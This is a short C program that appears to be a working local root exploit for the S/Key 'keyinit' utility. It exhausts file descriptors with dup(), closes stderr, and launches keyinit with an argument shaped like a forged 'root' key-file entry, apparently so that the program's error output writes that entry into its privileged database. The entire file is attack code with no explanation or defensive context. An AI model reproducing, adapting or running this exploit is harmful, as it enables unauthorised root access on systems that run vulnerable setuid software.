#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  while(dup(1) != -1);
  close(2);
  execl("/usr/bin/keyinit",
  "\nroot 0099 snosoft2 6f648e8bd0e2988a Apr 23,2666 01:02:03\n");
}
